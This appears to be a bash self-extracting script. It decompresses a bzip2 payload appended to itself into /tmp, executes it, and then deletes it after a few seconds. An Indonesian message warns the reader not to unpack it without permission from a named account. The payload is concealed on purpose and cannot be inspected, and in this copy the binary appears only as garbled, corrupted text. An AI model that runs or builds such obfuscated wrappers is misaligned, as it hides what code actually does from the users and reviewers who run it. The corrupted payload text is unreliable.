#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY"�QO  �߀@{�=%ߪ����@��D�CM�  ��=�M4�041��s �	������`���`$� �=2LS�Sd�m!�'�hѣ&OQ���Ź��&�1��Gh��BXT���`�$�_5�yfw�;6�8>���u~��o� �te-�$�.���l}��X�D�k[����jD�CClHpF���2$�R.��y�bg=b`e	��Bv�5Ԟe�|+A�ȧ?]fU$��H:t9����M�b��dbڎ,l+���y����)�J��C�g� �]道ڟ�.��ޣ�4�+[�wE:�^!�`|�>J��A�Ob,�����U�<|�P�AiF��|  縁�ҳk����GA����p&|�i�����9�s�8�b�H�¬̎�agid���N� ֐]Vz��.ЇB��-b~�0�A�ɂ��6�.�FG 1(��j|�����p3$mD2�=�OG$������=�~d������{����Dt@�����F)ٖ+҃k6LB�#�v7ȑS���i��b9�E�L��5�sWWv����E�B��,*/�7,$��
x�泵uB��1��$	l�cH���O�bhYL滠��0���!��&FE{�s`�p�#Z���d�C�V�VmQ�\���]��B@��E<